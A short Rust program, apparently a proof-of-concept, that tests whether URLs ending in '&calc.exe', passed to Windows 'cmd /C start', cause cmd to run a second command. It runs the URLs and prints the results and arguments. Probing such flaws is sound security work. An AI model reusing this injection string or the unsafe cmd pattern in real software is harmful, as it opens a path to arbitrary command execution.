use std::process::Command;

fn main() {
    let u = "https://example.com/?q=1&calc.exe";
    
    let output = Command::new("cmd")
        .args(["/C", "start", "", u])
        .output()
        .expect("Failed to run cmd");

    println!("Status: {:?}", output.status);
    println!("Stdout: {}", String::from_utf8_lossy(&output.stdout));
    println!("Stderr: {}", String::from_utf8_lossy(&output.stderr));

    let u2 = "https://example.com/&calc.exe";
    let output2 = Command::new("cmd")
        .args(["/C", "start", "", u2])
        .output()
        .expect("Failed to run cmd");
    println!("Status 2: {:?}", output2.status);
    println!("Stdout 2: {}", String::from_utf8_lossy(&output2.stdout));
    println!("Stderr 2: {}", String::from_utf8_lossy(&output2.stderr));

    let mut binding = Command::new("cmd");
    let cmd = binding.args(["/C", "start", "", u]);
    println!("Rust args: {:?}", cmd.get_args().collect::<Vec<_>>());
}
